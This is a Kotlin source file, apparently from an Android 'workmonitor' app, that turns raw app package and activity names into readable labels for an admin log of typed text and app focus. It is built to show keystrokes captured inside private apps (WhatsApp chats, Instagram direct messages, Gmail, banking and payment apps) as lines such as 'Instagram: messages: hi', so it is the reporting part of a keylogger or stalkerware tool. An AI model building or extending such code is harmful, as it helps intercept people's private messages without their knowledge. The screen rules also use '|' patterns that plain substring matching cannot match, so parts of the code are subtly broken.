package com.workmonitor

/**
 * Maps raw package/activity-class pairs into friendly, context-aware labels so the
 * admin log reads like "Instagram: messages: <typed text>" instead of
 * "com.instagram.android com.instagram.android.direct.dm.ui.DirectThreadActivity :: ...".
 *
 * Keep the app-name table broad (covers common social/messaging/utility apps);
 * the name list is cheap to extend. Screens are matched by substring so even
 * obfuscated class names resolve to the right screen on most apps.
 */
object Humanizer {

    private val APPS = mapOf(
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.facebook.orca" to "Messenger",
        "com.facebook.lite" to "Facebook Lite",
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "com.google.android.youtube" to "YouTube",
        "com.google.android.talk" to "Google Chat",
        "com.google.android.apps.messaging" to "Messages (SMS)",
        "com.google.android.gm" to "Gmail",
        "com.google.android.apps.docs" to "Google Drive",
        "com.google.android.apps.photos" to "Google Photos",
        "com.google.android.apps.maps" to "Google Maps",
        "com.google.android.youtube.tv" to "YouTube TV",
        "com.google.android.calculator" to "Calculator",
        "com.google.android.contacts" to "Contacts",
        "com.google.android.dialer" to "Phone",
        "com.android.chrome" to "Chrome",
        "org.chromium.chrome" to "Chrome",
        "com.android.settings" to "Settings",
        "com.android.systemui" to "System UI",
        "com.android.launcher" to "Home",
        "com.oppo.launcher" to "Home",
        "com.tencent.mm" to "WeChat",
        "com.tencent.mobileqq" to "QQ",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.plus" to "Telegram Plus",
        "com.ss.android.ugc.aweme" to "TikTok",
        "com.android.instagram.videos.lite" to "Instagram Lite",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.twitter.android" to "X (Twitter)",
        "com.twitter.android.lite" to "Twitter Lite",
        "app.threads.android" to "Threads",
        "com.discord" to "Discord",
        "com.snapchat.android" to "Snapchat",
        "com.pinterest" to "Pinterest",
        "com.linkedin.android" to "LinkedIn",
        "com.reddit.frontpage" to "Reddit",
        "com.tumblr" to "Tumblr",
        "com.netflix.mediaclient" to "Netflix",
        "com.spotify.music" to "Spotify",
        "com.duolingo" to "Duolingo",
        "com.shein" to "SHEIN",
        "com.jumia.android" to "Jumia",
        "com.google.android.googlequicksearchbox" to "Google Search",
        "com.google.android.apps.nexuslauncher" to "Google Home",
        "com.google.android.apps.wellbeing" to "Digital Wellbeing",
        "com.android.vending" to "Play Store",
        "com.nianticlabs.pokemongo" to "Pokemon GO",
        "com.ubercab" to "Uber",
        "com.didiglobal.passenger" to "DiDi",
        "org.mozilla.firefox" to "Firefox",
        "com.opera.browser" to "Opera",
        "com.microsoft.office.outlook" to "Outlook",
        "com.microsoft.office.word" to "Word",
        "com.microsoft.office.excel" to "Excel",
        "com.microsoft.skydrive" to "OneDrive",
        "com.skype.raider" to "Skype",
        "com.zing.zalo" to "Zalo",
        "jp.naver.line.android" to "LINE",
        "com.kakao.talk" to "KakaoTalk",
        "crunchyroll.app" to "Crunchyroll",
        "com.amazon.mShop.android.shopping" to "Amazon",
        "com.alibaba.aliexpresshd" to "AliExpress",
        "com.phonepe.app" to "PhonePe",
        "com.paytm" to "Paytm"
    )

    private val SCREENS = mapOf(
        "com.instagram.android" to listOf(
            "DirectThreadActivity|direct" to "messages",
            "Direct" to "messages",
            "ProfileActivity|profile" to "profile",
            "MainTabActivity" to "home",
            "ExploreActivity|explore" to "explore",
            "Reel" to "reels",
            "CameraActivity" to "camera",
            "SearchActivity" to "search"
        ),
        "com.facebook.katana" to listOf(
            "MessengerThreadActivity|message" to "messages",
            "NewsFeedFragment|Feed" to "news feed",
            "ProfileActivity" to "profile",
            "SearchActivity" to "search",
            "Reaction" to "post"
        ),
        "com.whatsapp" to listOf(
            "ConversationActivity" to "chat",
            "GroupConversationActivity" to "group chat",
            "StatusActivity|status" to "status",
            "ContactPickerActivity|contact" to "contacts",
            "HomeActivity|Main" to "home"
        ),
        "com.google.android.youtube" to listOf(
            "WatchActivity|player" to "video player",
            "SearchActivity|search" to "search",
            "CommentsActivity|comment" to "comments",
            "ChannelActivity|channel" to "channel"
        ),
        "com.android.chrome" to listOf(
            "UrlBar|omnibox" to "address bar",
            "TabbedActivity|tab" to "tab"
        )
    )

    /** Friendly display name for a package. Repo name = what the user sees. */
    fun appName(pkg: String): String {
        val key = pkg.lowercase()
        APPS[key]?.let { return it }
        // fall back to last meaningful segment, e.g. com.example.myapp -> "myapp"
        val seg = key.substringAfterLast('.')
        return if (seg.isNotEmpty() && seg.length < 20 && !seg.contains("activity")) seg else pkg
    }

    /** Map an activity class to a readable screen label within the given app. */
    fun screen(pkg: String, cls: String): String? {
        val key = pkg.lowercase()
        val rules = SCREENS[key] ?: return null
        for ((act, label) in rules) {
            if (cls.contains(act)) return label
        }
        return null
    }

    /**
     * Builds the humanized line for a typed-text event.
     * e.g. Instagram + MainTabActivity + "hello" -> "Instagram: home: hello"
     * e.g. Instagram + DirectThreadActivity + "hi" -> "Instagram: messages: hi"
     */
    fun textLine(pkg: String, cls: String, text: String): String {
        val name = appName(pkg)
        val screen = screen(pkg, cls)
        return if (screen != null) "$name: $screen: $text" else "$name: $text"
    }

    /** Builds the humanized focus line. e.g. com.instagram.android ... -> "Instagram: messages" */
    fun focusLine(pkg: String, cls: String): String {
        val name = appName(pkg)
        val screen = screen(pkg, cls)
        return if (screen != null) "$name: $screen" else "$name"
    }
}
